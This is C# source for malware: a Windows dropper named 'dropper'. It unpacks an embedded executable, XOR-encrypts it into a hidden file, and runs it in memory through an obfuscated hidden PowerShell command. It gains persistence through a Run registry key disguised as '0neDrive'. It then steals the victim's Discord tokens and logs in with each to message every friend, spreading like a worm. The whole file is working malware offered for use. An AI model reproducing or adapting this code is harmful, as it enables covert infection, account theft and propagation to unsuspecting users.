using System;
using System.Threading;
using System.Linq;
using System.Diagnostics;
using System.Reflection;
using System.IO;
using System.Text;
using Microsoft.Win32;

using Discord;
using Discord.Gateway;

namespace dropper
{
    internal class Program
    {
        private static string token = "";
        private static string prefix = "";
        private static string geolock = "";
        private static string spreadmessage = @"";
        private static bool enable_spread = false;

        static void Main()
        {
            Random rng = new Random();
            string xorkey = RandomString(20, rng);
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream mstream = asm.GetManifestResourceStream("dropper.payload.exe");
            mstream.CopyTo(ms);
            mstream.Dispose();
            byte[] payload_data = ms.ToArray();
            ms.Dispose();
            byte[] encrypted = XORCrypt(payload_data, xorkey);
            string temppath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\wello.tmp";
            if (File.Exists(temppath)) Environment.Exit(1);
            File.WriteAllBytes(temppath, encrypted);
            File.SetAttributes(temppath, FileAttributes.System | FileAttributes.Hidden);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } }"));
            string payload = $"powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname}([System.IO.File]::ReadAllBytes('{temppath}'), '{xorkey}')).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("0neDrive", payload);
            key.Dispose();
            Process.Start("cmd.exe", "/c " + payload);

            if (!enable_spread) Environment.Exit(0);
            string[] tokens = TokenGrabber.GetTokens();
            foreach (string t in tokens)
            {
                try
                {
                    bool done = false;
                    DiscordSocketClient client = new DiscordSocketClient();
                    client.OnLoggedIn += async (c, args) =>
                    {
                        var relationships = c.GetRelationships();
                        foreach (DiscordRelationship r in relationships)
                        {
                            if (r.Type == RelationshipType.Friends || r.Type == RelationshipType.None)
                            {
                                c.CreateDM(r.User.Id).SendMessage(spreadmessage);
                            }
                        }
                        done = true;
                    };
                    client.Login(t);
                    while (!done) Thread.Sleep(100);
                    client.Logout();
                    client.Dispose();
                }
                catch { continue; }
            }
            Thread.Sleep(-1);
        }

        static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }

        static byte[] XORCrypt(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
            }
            return input;
        }
    }
}